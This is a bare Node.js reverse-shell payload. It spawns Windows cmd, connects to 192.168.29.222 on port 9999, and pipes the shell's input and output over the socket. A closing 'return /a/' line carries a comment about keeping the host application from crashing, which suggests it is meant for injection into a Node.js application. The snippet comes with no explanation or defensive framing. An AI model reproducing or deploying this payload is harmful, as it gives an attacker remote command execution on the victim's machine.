(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd", []);
    var client = new net.Socket();
    client.connect(9999, "192.168.29.222", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
